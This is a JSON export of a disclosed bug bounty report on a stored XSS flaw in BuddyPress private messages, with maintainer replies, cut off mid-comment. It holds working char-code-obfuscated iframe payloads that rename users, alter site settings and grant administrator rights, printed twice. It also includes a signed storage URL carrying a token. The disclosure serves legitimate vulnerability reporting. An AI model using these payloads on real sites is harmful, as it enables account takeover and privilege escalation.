{"id":487081,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80ODcwODE=","url":"https://hackerone.com/reports/487081","title":"Stored XSS in Private Message component (BuddyPress)","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2019-01-28T07:45:00.790Z","submitted_at":"2019-01-28T07:45:00.790Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"klmunday","url":"/klmunday","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/480/267/c2322c402151db1b8a6b7474b47bfc4b1c415b4a_original.JPG/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":55,"url":"https://hackerone.com/wordpress","handle":"wordpress","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"WordPress","twitter_handle":"wordpress","website":"https://wordpress.org/","about":"Beautiful sites of any kind."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-03-08T22:28:04.374Z","bug_reporter_agreed_on_going_public_at":"2019-03-08T20:29:46.924Z","team_member_agreed_on_going_public_at":"2019-03-08T22:28:04.280Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Description:\nWordPress version: **5.0.3**\nBuddyPress version: **4.1.0**\n\nUsers with accounts can send private messages containing rendered HTML to other uses, this includes being able to execute javascript code via elements such as scripts, iframe etc. The XSS is stored in the database and is triggered any time a user reads the message. This includes the message preview window which shows the last message the user has received (or sent).\n\nThe code which runs can be exploited to perform any action that the \"Victim\" has permissions for, this is especially dangerous for privileged users such as administrators since it allows access to the WordPress settings and private information such as users emails. This includes any actions for other plugins etc.\n\nThe only prerequisites for this is that private messaging is enabled in the BuddyPress settings and that the attacker has an account (with default permissions).\n\n## Steps To Reproduce:\nVia composing a new message\n1. Go to another users profile\n2. Click private message\n3. Type any subject\n4. Type the following message  `Test\u003ciframe src=javascript:alert(1) width=0 height=0 style=display:none;\u003e\u003c/iframe\u003e`\n5. Send the message\n6. View the message (triggers the XSS)\n7. Wait for the victim to read the message\n\nVia replying to an existing thread\n1. Go to your inbox\n2. View any message you have received\n3. Respond to the message with `Test\u003ciframe src=javascript:alert(1) width=0 height=0 style=display:none;\u003e\u003c/iframe\u003e`\n4. View the message (triggers the XSS)\n5. Wait for the victim to read the message\n\nPayloads containing spaces can also be sent however the src cannot contain any spaces or quotations so it needs to be converted into char codes, combined into a string and eval'd:\n**example:**\n```\n\u003ciframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,116,101,115,116,32,61,32,49,50,51,59,10,97,108,101,114,116,40,116,101,115,116,41,59])) width=0 height=0 style=display:none;\u003e\u003c/iframe\u003e\n```\n**would run**\n```javascript\nlet test = 123;\nalert(test);\n```\n\nLarger payloads can be used. However, due to the code needing to be in an array of char codes (if it contains spaces or quotations) I have written a small python script to convert javascript code into a sendable message. It also includes some Proof of concept payloads which perform the following:\n- Change the users username to `HACKED` (affects any user)\n- Change the websites title and description (requires a privileged user to read the message)\n- Change a users permissions to administrator (requires a privileged user to read the message)\n\nPlease see the attached zip file for the script and payloads (they have not been pre-converted)\n\nSee some example payloads below: \n(note: the spacing is to prevent the iframe element being visible in the message exert displayed in the inbox - it is not required for it to work, nor is the start of the message, only the iframe is needed).\n**Change username to `HACKED`**\n```\nThis is a malicious message.                    \u003ciframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,110,97,109,101,32,61,32,112,97,114,101,110,116,46,66,80,95,78,111,117,118,101,97,117,46,109,101,115,115,97,103,101,115,46,114,111,111,116,85,114,108,46,115,112,108,105,116,40,39,47,39,41,91,50,93,59,10,108,101,116,32,117,114,108,32,61,32,112,97,114,101,110,116,46,108,111,99,97,116,105,111,110,46,111,114,105,103,105,110,32,43,32,39,47,109,101,109,98,101,114,115,47,39,32,43,32,110,97,109,101,32,43,32,39,47,112,114,111,102,105,108,101,47,101,100,105,116,47,103,114,111,117,112,47,49,47,39,59,10,10,112,97,114,101,110,116,46,106,81,117,101,114,121,46,97,106,97,120,40,123,117,114,108,58,32,117,114,108,44,32,116,121,112,101,58,32,39,71,69,84,39,44,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,104,116,109,108,95,114,101,115,112,111,110,115,101,41,32,123,10,32,32,32,32,108,101,116,32,100,111,109,32,61,32,112,97,114,101,110,116,46,106,81,117,101,114,121,40,104,116,109,108,95,114,101,115,112,111,110,115,101,41,59,10,32,32,32,32,100,111,109,46,102,105,110,100,40,39,105,110,112,117,116,91,110,97,109,101,61,34,102,105,101,108,100,95,49,34,93,39,41,46,118,97,108,40,39,72,65,67,75,69,68,39,41,59,10,32,32,32,32,112,97,114,101,110,116,46,106,81,117,101,114,121,46,97,106,97,120,40,123,117,114,108,58,32,100,111,109,46,102,105,110,100,40,39,35,112,114,111,102,105,108,101,45,101,100,105,116,45,102,111,114,109,39,41,46,97,116,116,114,40,39,97,99,116,105,111,110,39,41,44,32,116,121,112,101,58,32,39,80,79,83,84,39,44,32,100,97,116,97,58,32,100,111,109,46,102,105,110,100,40,39,35,112,114,111,102,105,108,101,45,101,100,105,116,45,102,111,114,109,39,41,46,115,101,114,105,97,108,105,122,101,40,41,125,41,10,125,125,41,59,10])) width=0 height=0 style=display:none;\u003e\u003c/iframe\u003e\n```\n\n**Change site title and description:** (requires admin to read message)\n```\nThis is a malicious message.                    \u003ciframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,110,101,119,95,115,105,116,101,95,116,105,116,108,101,32,61,32,39,72,65,67,75,69,68,39,59,10,108,101,116,32,110,101,119,95,115,105,116,101,95,100,101,115,99,114,105,112,116,105,111,110,32,61,32,39,118,105,97,32,88,83,83,39,59,10,108,101,116,32,117,114,108,32,61,32,112,97,114,101,110,116,46,108,111,99,97,116,105,111,110,46,111,114,105,103,105,110,32,43,32,39,47,119,112,45,97,100,109,105,110,47,111,112,116,105,111,110,115,45,103,101,110,101,114,97,108,46,112,104,112,39,59,10,10,112,97,114,101,110,116,46,106,81,117,101,114,121,46,97,106,97,120,40,123,117,114,108,58,32,117,114,108,44,32,116,121,112,101,58,32,39,71,69,84,39,44,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,104,116,109,108,95,114,101,115,112,111,110,115,101,41,32,123,10,32,32,32,32,108,101,116,32,100,111,109,32,61,32,112,97,114,101,110,116,46,106,81,117,101,114,121,40,104,116,109,108,95,114,101,115,112,111,110,115,101,41,59,10,32,32,32,32,100,111,109,46,102,105,110,100,40,39,105,110,112,117,116,91,110,97,109,101,61,34,98,108,111,103,110,97,109,101,34,93,39,41,46,118,97,108,40,110,101,119,95,115,105,116,101,95,116,105,116,108,101,41,59,10,32,32,32,32,100,111,109,46,102,105,110,100,40,39,105,110,112,117,116,91,110,97,109,101,61,34,98,108,111,103,100,101,115,99,114,105,112,116,105,111,110,34,93,39,41,46,118,97,108,40,110,101,119,95,115,105,116,101,95,100,101,115,99,114,105,112,116,105,111,110,41,59,10,32,32,32,32,112,97,114,101,110,116,46,106,81,117,101,114,121,46,97,106,97,120,40,123,117,114,108,58,32,112,97,114,101,110,116,46,108,111,99,97,116,105,111,110,46,111,114,105,103,105,110,32,43,32,39,47,119,112,45,97,100,109,105,110,47,111,112,116,105,111,110,115,46,112,104,112,39,44,32,116,121,112,101,58,32,39,80,79,83,84,39,44,32,100,97,116,97,58,32,100,111,109,46,102,105,110,100,40,39,102,111,114,109,39,41,46,115,101,114,105,97,108,105,122,101,40,41,125,41,10,125,125,41,59])) width=0 height=0 style=display:none;\u003e\u003c/iframe\u003e\n```\n\n**Change user permissions for the user with id `2` to administrator** (requires admin to read message)\n```\nThis is a malicious message.                    \u003ciframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,117,114,108,32,61,32,112,97,114,101,110,116,46,108,111,99,97,116,105,111,110,46,111,114,105,103,105,110,32,43,32,39,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,101,100,105,116,46,112,104,112,63,117,115,101,114,95,105,100,61,50,38,119,112,95,104,116,116,112,95,114,101,102,101,114,101,114,61,47,119,112,45,97,100,109,105,110,47,117,115,101,114,115,46,112,104,112,39,59,10,10,112,97,114,101,110,116,46,106,81,117,101,114,121,46,97,106,97,120,40,123,117,114,108,58,32,117,114,108,44,32,116,121,112,101,58,32,39,71,69,84,39,44,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,104,116,109,108,95,114,101,115,112,111,110,115,101,41,32,123,10,32,32,32,32,108,101,116,32,100,111,109,32,61,32,112,97,114,101,110,116,46,106,81,117,101,114,121,40,104,116,109,108,95,114,101,115,112,111,110,115,101,41,59,10,32,32,32,32,100,111,109,46,102,105,110,100,40,39,115,101,108,101,99,116,91,110,97,109,101,61,34,114,111,108,101,34,93,39,41,46,112,114,111,112,40,34,115,101,108,101,99,116,101,100,73,110,100,101,120,34,44,32,52,41,59,10,32,32,32,32,112,97,114,101,110,116,46,106,81,117,101,114,121,46,97,106,97,120,40,123,117,114,108,58,32,100,111,109,46,102,105,110,100,40,39,102,111,114,109,39,41,46,97,116,116,114,40,39,97,99,116,105,111,110,39,41,44,32,116,121,112,101,58,32,39,80,79,83,84,39,44,32,100,97,116,97,58,32,100,111,109,46,102,105,110,100,40,39,102,111,114,109,39,41,46,115,101,114,105,97,108,105,122,101,40,41,125,41,10,125,125,41,59])) width=0 height=0 style=display:none;\u003e\u003c/iframe\u003e\n```\n\nFor a more detailed write-up including images please view this [Google Doc (unlisted)](https://docs.google.com/document/d/1RgMWJlYen9iR_JTxATYR4TJWAPKRgaSKuiiqZp7x8L0/edit?usp=sharing) (if this is not allowed please let me know so that I can include them here if necessary)\n\n## Impact\n\nAn attacker could craft a payload to perform any action which their target can perform. This is especially dangerous for administrators since if the attacker targeted them they could modify site data/content, modify accounts, read sensitive information such as users private information and more.\n\nIn my testing I was able to change profile names, change users passwords, read users email addresses, modify pages, modify the site data and modify the WordPress settings including the sites email address.\n\nI did not find anything I could not exploit which the targeted user had permissions to do, it seems depending on the target that the attacker can achieve full access to wp-admin and any other plugins that are installed and even chain requests together within a single attack.\n\nIt would also be possible to create a worm which when read would email its content to every other user again.","vulnerability_information_html":"\u003ch2 id=\"description\"\u003eDescription:\u003c/h2\u003e\n\n\u003cp\u003eWordPress version: \u003cstrong\u003e5.0.3\u003c/strong\u003e\u003cbr\u003e\nBuddyPress version: \u003cstrong\u003e4.1.0\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003eUsers with accounts can send private messages containing rendered HTML to other uses, this includes being able to execute javascript code via elements such as scripts, iframe etc. The XSS is stored in the database and is triggered any time a user reads the message. This includes the message preview window which shows the last message the user has received (or sent).\u003c/p\u003e\n\n\u003cp\u003eThe code which runs can be exploited to perform any action that the \u0026quot;Victim\u0026quot; has permissions for, this is especially dangerous for privileged users such as administrators since it allows access to the WordPress settings and private information such as users emails. This includes any actions for other plugins etc.\u003c/p\u003e\n\n\u003cp\u003eThe only prerequisites for this is that private messaging is enabled in the BuddyPress settings and that the attacker has an account (with default permissions).\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cp\u003eVia composing a new message\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eGo to another users profile\u003c/li\u003e\n\u003cli\u003eClick private message\u003c/li\u003e\n\u003cli\u003eType any subject\u003c/li\u003e\n\u003cli\u003eType the following message  \u003ccode\u003eTest\u0026lt;iframe src=javascript:alert(1) width=0 height=0 style=display:none;\u0026gt;\u0026lt;/iframe\u0026gt;\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eSend the message\u003c/li\u003e\n\u003cli\u003eView the message (triggers the XSS)\u003c/li\u003e\n\u003cli\u003eWait for the victim to read the message\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eVia replying to an existing thread\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eGo to your inbox\u003c/li\u003e\n\u003cli\u003eView any message you have received\u003c/li\u003e\n\u003cli\u003eRespond to the message with \u003ccode\u003eTest\u0026lt;iframe src=javascript:alert(1) width=0 height=0 style=display:none;\u0026gt;\u0026lt;/iframe\u0026gt;\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eView the message (triggers the XSS)\u003c/li\u003e\n\u003cli\u003eWait for the victim to read the message\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003ePayloads containing spaces can also be sent however the src cannot contain any spaces or quotations so it needs to be converted into char codes, combined into a string and eval\u0026#39;d:\u003cbr\u003e\n\u003cstrong\u003eexample:\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,116,101,115,116,32,61,32,49,50,51,59,10,97,108,101,114,116,40,116,101,115,116,41,59])) width=0 height=0 style=display:none;\u0026gt;\u0026lt;/iframe\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003ewould run\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003elet\u003c/span\u003e \u003cspan class=\"nx\"\u003etest\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e123\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nx\"\u003ealert\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003etest\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eLarger payloads can be used. However, due to the code needing to be in an array of char codes (if it contains spaces or quotations) I have written a small python script to convert javascript code into a sendable message. It also includes some Proof of concept payloads which perform the following:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eChange the users username to \u003ccode\u003eHACKED\u003c/code\u003e (affects any user)\u003c/li\u003e\n\u003cli\u003eChange the websites title and description (requires a privileged user to read the message)\u003c/li\u003e\n\u003cli\u003eChange a users permissions to administrator (requires a privileged user to read the message)\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003ePlease see the attached zip file for the script and payloads (they have not been pre-converted)\u003c/p\u003e\n\n\u003cp\u003eSee some example payloads below: \u003cbr\u003e\n(note: the spacing is to prevent the iframe element being visible in the message exert displayed in the inbox - it is not required for it to work, nor is the start of the message, only the iframe is needed).\u003cbr\u003e\n\u003cstrong\u003eChange username to \u003ccode\u003eHACKED\u003c/code\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eThis is a malicious message.                    \u0026lt;iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,110,97,109,101,32,61,32,112,97,114,101,110,116,46,66,80,95,78,111,117,118,101,97,117,46,109,101,115,115,97,103,101,115,46,114,111,111,116,85,114,108,46,115,112,108,105,116,40,39,47,39,41,91,50,93,59,10,108,101,116,32,117,114,108,32,61,32,112,97,114,101,110,116,46,108,111,99,97,116,105,111,110,46,111,114,105,103,105,110,32,43,32,39,47,109,101,109,98,101,114,115,47,39,32,43,32,110,97,109,101,32,43,32,39,47,112,114,111,102,105,108,101,47,101,100,105,116,47,103,114,111,117,112,47,49,47,39,59,10,10,112,97,114,101,110,116,46,106,81,117,101,114,121,46,97,106,97,120,40,123,117,114,108,58,32,117,114,108,44,32,116,121,112,101,58,32,39,71,69,84,39,44,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,104,116,109,108,95,114,101,115,112,111,110,115,101,41,32,123,10,32,32,32,32,108,101,116,32,100,111,109,32,61,32,112,97,114,101,110,116,46,106,81,117,101,114,121,40,104,116,109,108,95,114,101,115,112,111,110,115,101,41,59,10,32,32,32,32,100,111,109,46,102,105,110,100,40,39,105,110,112,117,116,91,110,97,109,101,61,34,102,105,101,108,100,95,49,34,93,39,41,46,118,97,108,40,39,72,65,67,75,69,68,39,41,59,10,32,32,32,32,112,97,114,101,110,116,46,106,81,117,101,114,121,46,97,106,97,120,40,123,117,114,108,58,32,100,111,109,46,102,105,110,100,40,39,35,112,114,111,102,105,108,101,45,101,100,105,116,45,102,111,114,109,39,41,46,97,116,116,114,40,39,97,99,116,105,111,110,39,41,44,32,116,121,112,101,58,32,39,80,79,83,84,39,44,32,100,97,116,97,58,32,100,111,109,46,102,105,110,100,40,39,35,112,114,111,102,105,108,101,45,101,100,105,116,45,102,111,114,109,39,41,46,115,101,114,105,97,108,105,122,101,40,41,125,41,10,125,125,41,59,10])) width=0 height=0 style=display:none;\u0026gt;\u0026lt;/iframe\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eChange site title and description:\u003c/strong\u003e (requires admin to read message)\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eThis is a malicious message.                    \u0026lt;iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,110,101,119,95,115,105,116,101,95,116,105,116,108,101,32,61,32,39,72,65,67,75,69,68,39,59,10,108,101,116,32,110,101,119,95,115,105,116,101,95,100,101,115,99,114,105,112,116,105,111,110,32,61,32,39,118,105,97,32,88,83,83,39,59,10,108,101,116,32,117,114,108,32,61,32,112,97,114,101,110,116,46,108,111,99,97,116,105,111,110,46,111,114,105,103,105,110,32,43,32,39,47,119,112,45,97,100,109,105,110,47,111,112,116,105,111,110,115,45,103,101,110,101,114,97,108,46,112,104,112,39,59,10,10,112,97,114,101,110,116,46,106,81,117,101,114,121,46,97,106,97,120,40,123,117,114,108,58,32,117,114,108,44,32,116,121,112,101,58,32,39,71,69,84,39,44,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,104,116,109,108,95,114,101,115,112,111,110,115,101,41,32,123,10,32,32,32,32,108,101,116,32,100,111,109,32,61,32,112,97,114,101,110,116,46,106,81,117,101,114,121,40,104,116,109,108,95,114,101,115,112,111,110,115,101,41,59,10,32,32,32,32,100,111,109,46,102,105,110,100,40,39,105,110,112,117,116,91,110,97,109,101,61,34,98,108,111,103,110,97,109,101,34,93,39,41,46,118,97,108,40,110,101,119,95,115,105,116,101,95,116,105,116,108,101,41,59,10,32,32,32,32,100,111,109,46,102,105,110,100,40,39,105,110,112,117,116,91,110,97,109,101,61,34,98,108,111,103,100,101,115,99,114,105,112,116,105,111,110,34,93,39,41,46,118,97,108,40,110,101,119,95,115,105,116,101,95,100,101,115,99,114,105,112,116,105,111,110,41,59,10,32,32,32,32,112,97,114,101,110,116,46,106,81,117,101,114,121,46,97,106,97,120,40,123,117,114,108,58,32,112,97,114,101,110,116,46,108,111,99,97,116,105,111,110,46,111,114,105,103,105,110,32,43,32,39,47,119,112,45,97,100,109,105,110,47,111,112,116,105,111,110,115,46,112,104,112,39,44,32,116,121,112,101,58,32,39,80,79,83,84,39,44,32,100,97,116,97,58,32,100,111,109,46,102,105,110,100,40,39,102,111,114,109,39,41,46,115,101,114,105,97,108,105,122,101,40,41,125,41,10,125,125,41,59])) width=0 height=0 style=display:none;\u0026gt;\u0026lt;/iframe\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eChange user permissions for the user with id \u003ccode\u003e2\u003c/code\u003e to administrator\u003c/strong\u003e (requires admin to read message)\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eThis is a malicious message.                    \u0026lt;iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,117,114,108,32,61,32,112,97,114,101,110,116,46,108,111,99,97,116,105,111,110,46,111,114,105,103,105,110,32,43,32,39,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,101,100,105,116,46,112,104,112,63,117,115,101,114,95,105,100,61,50,38,119,112,95,104,116,116,112,95,114,101,102,101,114,101,114,61,47,119,112,45,97,100,109,105,110,47,117,115,101,114,115,46,112,104,112,39,59,10,10,112,97,114,101,110,116,46,106,81,117,101,114,121,46,97,106,97,120,40,123,117,114,108,58,32,117,114,108,44,32,116,121,112,101,58,32,39,71,69,84,39,44,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,104,116,109,108,95,114,101,115,112,111,110,115,101,41,32,123,10,32,32,32,32,108,101,116,32,100,111,109,32,61,32,112,97,114,101,110,116,46,106,81,117,101,114,121,40,104,116,109,108,95,114,101,115,112,111,110,115,101,41,59,10,32,32,32,32,100,111,109,46,102,105,110,100,40,39,115,101,108,101,99,116,91,110,97,109,101,61,34,114,111,108,101,34,93,39,41,46,112,114,111,112,40,34,115,101,108,101,99,116,101,100,73,110,100,101,120,34,44,32,52,41,59,10,32,32,32,32,112,97,114,101,110,116,46,106,81,117,101,114,121,46,97,106,97,120,40,123,117,114,108,58,32,100,111,109,46,102,105,110,100,40,39,102,111,114,109,39,41,46,97,116,116,114,40,39,97,99,116,105,111,110,39,41,44,32,116,121,112,101,58,32,39,80,79,83,84,39,44,32,100,97,116,97,58,32,100,111,109,46,102,105,110,100,40,39,102,111,114,109,39,41,46,115,101,114,105,97,108,105,122,101,40,41,125,41,10,125,125,41,59])) width=0 height=0 style=display:none;\u0026gt;\u0026lt;/iframe\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eFor a more detailed write-up including images please view this \u003ca href=\"/redirect?url=https%3A%2F%2Fdocs.google.com%2Fdocument%2Fd%2F1RgMWJlYen9iR_JTxATYR4TJWAPKRgaSKuiiqZp7x8L0%2Fedit%3Fusp%3Dsharing\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eGoogle Doc (unlisted)\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e (if this is not allowed please let me know so that I can include them here if necessary)\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAn attacker could craft a payload to perform any action which their target can perform. This is especially dangerous for administrators since if the attacker targeted them they could modify site data/content, modify accounts, read sensitive information such as users private information and more.\u003c/p\u003e\n\n\u003cp\u003eIn my testing I was able to change profile names, change users passwords, read users email addresses, modify pages, modify the site data and modify the WordPress settings including the sites email address.\u003c/p\u003e\n\n\u003cp\u003eI did not find anything I could not exploit which the targeted user had permissions to do, it seems depending on the target that the attacker can achieve full access to wp-admin and any other plugins that are installed and even chain requests together within a single attack.\u003c/p\u003e\n\n\u003cp\u003eIt would also be possible to create a worm which when read would email its content to every other user again.\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":413696,"file_name":"BuddyPress_XSS_PoC.zip","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/413/696/ad2353973389519c38e2ba85f8922a401479c616/BuddyPress_XSS_PoC.zip?response-content-disposition=attachment%3B%20filename%3D%22BuddyPress_XSS_PoC.zip%22%3B%20filename%2A%3DUTF-8%27%27BuddyPress_XSS_PoC.zip\u0026response-content-type=application%2Fzip\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQUOQU5REA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T060626Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDKbajvkbgJ0bk%2BBvRtGQ7p5KCzGha%2FVaDDwyFq8CM66wIgaw7%2FMRI5kyRpH%2BnIlLG4ZnmM%2FrLjLjJWrmkX0zZfd9sqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDP91WL002Wbo0XGfnyqRA%2FNt3W4r54Z2Rrjnbzg30AtIqSAaUbiKh6dYPI5iumJt%2FacDVM4CmdTQCSkrpk45DFotrgtd1tIXQUPsAioE3hz70xop4zS0jebfAPdwBp38Mc3YKPYsW1TgWIT19zK4t%2B4eGJVFjPey5O%2FEfBu4XYpGDd%2Fy2VO0kVCb43%2F76mvlk6aWlA01UhpCilK3J%2F7qqZsw4P3jggaBSCjGhssHvqDLjMzfR%2FDpDE7VaotOr3rJmP5ZK66Q9%2BkoG5kaLgKcslwRO9FGLNBY8AuIhUCEMRp9RM9yBIFYe%2FyyvHRriCVGHEgdIJ9wvxaVVvCfEcWZw1dEIriA6BftAk5kML6b8WN8zwMI3cyqbnvBS9PGbEcrzzU67DDkEk0llxEfFqJB1g4ruY5L2BsxjsulOVXWFSQHoykg7EnBFBbQGmuPAyxW942tXfkTyjH7aQIFAbpwURAHEFFcnVcJBzYS%2B6tGyu1ozPdrsFK5Ko2OryeYDFeK8b9JxwAMZqBekNlk1Bn%2BWq2RJZZBgBTV1X9LfuQ%2FLbSAMJq2qv8FOusBgtnFtNPu6rgydFw%2BpCNudbVGZ39p3P2aIl7K%2B6fRTLBImgaGX5r2pXgGjSRb3Co5NHURzMlQWYw9SJdMt5vMsDNtT9otjm5R%2Fz00sRO779VmfaZOO18lLujlVlImBZA%2BY20iW%2B%2FVBR4UOivJTvxApUCo%2BQYZQghLFkO4s17mPPAo6XeP%2BtXjXhn71RPHuwavkbgQ0EuL1pf5gaqdarsB4psJiZ3FphFomE6unCMAErk3vFIwEIi%2Be5%2FjAIsDg6zS3oetmQEMR7IeJadGwnOF7tifKH8X2cyJk2IoG8HLG%2FfDEf2cBUt6EjPoIQ%3D%3D\u0026X-Amz-Signature=a6545a984d63037b1a4a96af189913a455475c4e068db59d4ed6708eced4c78e","file_size":2578,"type":"application/zip"}],"allow_singular_disclosure_at":"2019-04-07T20:29:46.998Z","allow_singular_disclosure_after":-54552999.53474639,"singular_disclosure_allowed":true,"vote_count":331,"voters":["reigertje","ibfaruhn","checkm50","d0xing","yash_","mik317","n0bytes","dhakal_ananda","architect","logicmap","and 321 more..."],"severity":{"rating":"critical","author_type":"User"},"structured_scope":{"databaseId":2751,"asset_type":"SOURCE_CODE","asset_identifier":"BuddyPress Core","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":4066376,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi Kieran,\n\nThank you for thoroughly and responsibly discussing your findings with us.\n\nMy name is John, and another BuddyPress lead (Boone) has confirmed your findings.\n\nWe are working internally on researching the exact conditions under which this flaw occurs, and also when and how it was introduced. We've narrowed it down a bit, and have already started working towards a patch which we will share with you as soon as one is available.\n\nOur goal is to get this fixed ASAP.\n\nThank you again, and talk soon,\n-JJJ","markdown_message":"\u003cp\u003eHi Kieran,\u003c/p\u003e\n\n\u003cp\u003eThank you for thoroughly and responsibly discussing your findings with us.\u003c/p\u003e\n\n\u003cp\u003eMy name is John, and another BuddyPress lead (Boone) has confirmed your findings.\u003c/p\u003e\n\n\u003cp\u003eWe are working internally on researching the exact conditions under which this flaw occurs, and also when and how it was introduced. We\u0026#39;ve narrowed it down a bit, and have already started working towards a patch which we will share with you as soon as one is available.\u003c/p\u003e\n\n\u003cp\u003eOur goal is to get this fixed ASAP.\u003c/p\u003e\n\n\u003cp\u003eThank you again, and talk soon,\u003cbr\u003e\n-JJJ\u003c/p\u003e\n","automated_response":false,"created_at":"2019-01-30T18:33:28.348Z","updated_at":"2019-01-30T18:33:28.348Z","actor":{"username":"jjj","cleared":false,"url":"/jjj","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/063/b21324cc7d9861888c1ddd4fa345cda6612361ff_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4075861,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi John,\n\nThank you for the quick response, I am glad to hear that a patch is already underway\nI've got some spare time this weekend so I may be able to dig a bit more into this.\n\nThanks again,","markdown_message":"\u003cp\u003eHi John,\u003c/p\u003e\n\n\u003cp\u003eThank you for the quick response, I am glad to hear that a patch is already underway\u003cbr\u003e\nI\u0026#39;ve got some spare time this weekend so I may be able to dig a bit more into 